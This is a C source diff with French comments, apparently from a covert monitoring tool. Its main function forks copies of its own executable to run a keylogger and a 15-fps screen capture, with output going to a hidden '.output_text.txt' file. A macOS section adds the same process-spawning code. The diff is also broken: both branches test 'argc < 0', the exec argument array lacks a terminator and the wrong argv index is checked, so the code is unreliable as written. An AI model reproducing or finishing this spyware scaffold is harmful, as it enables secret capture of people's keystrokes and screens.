@@ -13,7 +13,7 @@ const char *output_file = ".output_text.txt";
 
 #define MAX_PATH 1024
 
-void start(char *path){
+void start(char *path, char *arg){
 
     pid_t pid = fork();  // Créer un processus enfant
 
@@ -28,7 +28,7 @@ void start(char *path){
         printf("Le processus enfant commence à exécuter une commande.\n");
 
         // Exemple de commande avec arguments
-        char *args[] = {"ls", "-l", "/home", NULL};
+        char *args[] = {path, arg};
 
         // Remplacer le processus enfant par "ls -l /home"
         if (execvp(args[0], args) == -1) {
@@ -36,14 +36,7 @@ void start(char *path){
             perror("execvp échoué");
             exit(1);  // Terminer l'enfant si exec échoue
         }
-    } else {
-        // Code du processus parent
-        printf("Le processus parent continue sans attendre l'enfant.\n");
-
-        // Le parent peut faire autre chose ici (par exemple, attendre que l'enfant se termine)
-        // sans être bloqué
     }
-
 }
 
 // Fonction pour récupérer le chemin d'un processus à partir de son PID
@@ -80,11 +73,24 @@ void get_parent_path(pid_t pid, char *path) {
     printf("Le chemin du parent est: %s\n", path);
 }
 
-int main() {
+int main(int argc, char *argv[]) {
     pid_t pid = getpid();
     char path[MAX_PATH];
 
     get_parent_path(pid, path);    
+
+    if (argc < 0){
+        start(path, "1");
+        start(path, "2");
+
+    } else if (argc < 0) {
+        if (strcmp(argv[0], "1") == 0){
+            keylogger(output_file);
+        }
+        else {
+            capture_screen_at_fps(15, output_dir);
+        }
+    }
 
     return 0;
 };
@@ -93,6 +99,57 @@ int main() {
 #endif
 
 #ifdef __APPLE__
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/sysctl.h>
+#include <libproc.h>
+#include <string.h>
+
+#define MAX_PATH 1024
+
+void get_parent_path(pid_t pid) {
+    char path[MAX_PATH];
+    pid_t parent_pid = getppid();
+
+    // Utilisation de proc_pidpath pour obtenir le chemin du processus parent
+    int len = proc_pidpath(parent_pid, path, sizeof(path));
+    if (len <= 0) {
+        perror("proc_pidpath");
+        return;
+    }
+
+    printf("Le chemin de l'exécutable du parent (PID %d) est : %s\n", parent_pid, path);
+}
+
+void start(char *path, char *arg){
+
+    pid_t pid = fork();  // Créer un processus enfant
+
+    if (pid < 0) {
+        // En cas d'erreur
+        perror("fork");
+        exit(1);
+    }
+
+    if (pid == 0) {
+        // Code du processus enfant
+        printf("Le processus enfant commence à exécuter une commande.\n");
+
+        // Exemple de commande avec arguments
+        char *args[] = {path, arg};
+
+        // Remplacer le processus enfant par "ls -l /home"
+        if (execvp(args[0], args) == -1) {
+            // Si execvp échoue, afficher un message d'erreur
+            perror("execvp échoué");
+            exit(1);  // Terminer l'enfant si exec échoue
+        }
+    }
+}
 
 int main(int argc, char *argv[]) {
     char path[MAX_PATH];
